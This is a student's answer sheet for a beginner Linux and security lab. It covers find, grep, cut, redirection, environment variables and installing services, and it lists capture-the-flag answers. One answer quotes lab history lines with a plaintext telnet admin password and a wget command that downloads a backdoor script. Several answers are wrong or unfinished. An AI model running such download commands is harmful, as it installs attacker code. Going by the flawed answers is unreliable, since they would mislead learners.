
Create a file named my-file.txt with the touch command. Then execute the locate my-file.txt command. Do you find the file?

        Your response : yes
Run the command sudo updatedb. And run the locate my-file.txt command again. Do you find your file ?

        Your response : yes

With the command which, find the executable file nc and indicate the path

        Path :/bin/nc

With the command which, find the executable file becode. What is the flag ?

        Flag :BC{WH1CH_FL4G_EXECUTLE_FILE}

Search with find command for a file that contains the name "Edgar Allan Poe". What is the flag ?

        Flag :

Using the find command, find the file password.txt and specify the flag.

        locate password.txt
        find / -type f -name password.txt 
        Flag :BC{PASSWORD_FILE}
        

With the command find, find a file that starts with becode- and ends with .sh.

		find -type f -name becode-*.sh 2>/dev/null
		Flag :BC(YOU_C4N_FIND_ME_WITH_WICH_IF_AM_EXEC)

Using the find command to identify any file (not directory) modified in the last day, NOT owned by the root user and execute ls -l on them. Chaining/piping commands is NOT allowed!

        Your command : find / -mtime -1 -print ! -user root -type f

With the find command, find all the files that have an authorization of 0777.

        Your command: find . -perm 777


With the find command, find all the files in the folder /home/student/findme/ that have an authorization of 0777 and change the rights of these files to 0755

        Your command
 
     
     
## TEXT Manipulation
Exercises

Search all sequences containing "Loxondota" in /home/student/lorem.txt

        Flag :BC{GREP_ME_LOREM_FL4G}
        
        cmd : grep "^Loxondota" lorem.txt

Copy the file /etc/passwd to your home directory. Display the line starting with student name.

        Your commands : grep student. passwd 
         grep "student" passwd
student:x:1001:1001:,,,:/home/student:/bin/bash


Display the lines in the passwd file starting with login names of 3 or 4 characters.

        Your commands :

In the file /home/student/sample.txt how many different values are there in the first column? in the second?

        Your response : 8 
        Your command : cut -d "," -f 1 sample.txt | uniq | wc -l
        Second : 
        Your reponse: 7
        Your command : cut -d "," -f 2 sample.txt | uniq | wc -l


In the file /home/student/sample.txt sort the values in the second column by frequency of occurrence. (uniq -c can be useful)

        Your response : 4
        Your command : cut -d "," -f 2 sample.txt | sort | uniq -c 

In the file /home/student/iris.data Change the column separator (comma) to tab (make sure that the changes are applied to the file)

        Your response :
        Your command : echo "," | sed -i  's|,|\t|g' iris.data

In the file /home/student/iris.data, extract from this file the column 3 (petal length in cm) (use cut )

        Your response :
        Your command :cut -f 3 iris.data > petal.txt


In the file /home/student/iris.data, count the number of flower species (cut and uniq)

        Your response : 3
        Your command :cut -f 6 iris.data | sort | uniq -c 
        
In the file /home/student/iris.data, sort by increasing petal length (see sort options)

        Your response :
        Your command : cut -f 4 iris.data | sort -n
        sort -k 4 iris.data


In the file /home/student/iris.data, show only lines with petal length greater than the average size

        Your response : *STILL to work*
        Your command : cut -f 4 iris.data | sort -r

Using /etc/passwd, extract the user and home directory fields for all users on your student machine for which the shell is set to /bin/false.

        Your response : grep "/bin/false" passwd | sed s'|:|\t|g' | cut -f 1,6,7
        

## Linux : Piping and Redirection


Write the message "hello everyone" in a file called "test" by redirecting the output of the echo command.

  		Your command : echo > test "Hello everyone"

Write the message "goodbye" in the same file "test" by redirecting the output of the echo command and without overwriting the content of "test" and check with the cat command

        Your command : echo >> test2  "Goodbye"

Make the ls -la command redirect to the foo file

        Your command : ls -la > foo

Execute find /etc -name *conf* command and redirect errors (only errors) to a file named err.txt

        Your command : find /etc -name *conf*  2> err.txt

Repeat the previous exercise, this time redirecting the errors to the linux nothingness.

        Your command : find /etc -name *config* 2> /dev/null

Now redirect the standard output and the error output of the find /etc -name *conf* command to two different files (std.out and std.err)

        Your command : find /etc -name *config* > std.out 2>std.err 

 What does the mkfifo command do?

         Create named pipes (FIFOs) with the given NAMEs.

Create a pipe named "MyNammedPipe". Then execute the pwd command which will transmit the data in this pipe. Then use the cat command to read the contents of your "MyNammedPipe" pipe.

        Your commands : ######NEED TO WORK ON IT

With cat command, add number the lines in the file /etc/passwd with the command nl

        Your commands : cat -n /etc/passwd 

Using the previous nl command, the head and tail commands, display the lines of /etc/passwd between line 7 and line 12

        Your commands : ###NEED TO WORK ON IT### DIDN'T FIND IT
        


## Bash Environnement  


On your student machine what is the value of the FLAG environment variable ?

    FLAG : BC{EXPORT_B4SH_FLAG}

Currently if you notice your machine, the variable you have created will be deleted. What should you do to make your variable persistent? (With a Bash shell).

    Commands : export variable='myValue'
    

From a hacker's perspective, look for information that might be useful to you in the .history file.

    Your answer: 
    telnet 10.21.55.98 -login admin -pass MyP4ssW0rDiS3CuR3!
	 wget http://10.88.56.53/backdoor.sh
	 
    

From an analyst's perspective, look for information that might be useful to you in the .history file.

    Your answer
    

## Protocols and Servers 



On your kali (or other) , install ngnix to have an http server on port 8080. Replace the default page of ngnix by an html page displaying a hello world.

        No answer required
        sudo apt update
        sudo apt install nginx

What other well-known service could be used instead of nginx?

        Your answer : Apache, Python

On your student machine, create a temporary http server with python, on port 5000. Then on your kali machine, open a browser and go to the address 10.12.181.X:.

        Your command : python3 -m http.server 5000


Let's imagine that a hacker owns the domain name g00gle.com, which tool would allow him to obtain an ssl certificate (https) very easily?

        Your answer :

On a linux machine, what tool could you use to have a self-signed SSL certificate on your local machine (localhost) ?

        Your answer : OpenSSL
        sudo apt install openssl

On your student machine, install the ftp service and connect from your kali machine.

        sudo apt-get install vsftpd
        ftp localhost
        username: student
        admin: student
        service vsftpd start

What is the default port for ftp?

        Your answer :

Is the ftp protocol secured?

        Your answer :  No, plain old File Transfer Protocol (FTP) will never be a secure way to transfer files for one simple reason: it doesn't use any type of encryption
        better use SFTP : Secure File Transfer Protocol
                
On your student machine, install the telnet service and connect from your kali machine.

        sudo apt-get install  telnet
		
What is the default port for telnet?

        Your answer : 23

Is the telnet protocol secured?

        Your answer : NO

Create a share file with samba between your Kali machine and your student machine.

        No answer required


## Download Files



    
      
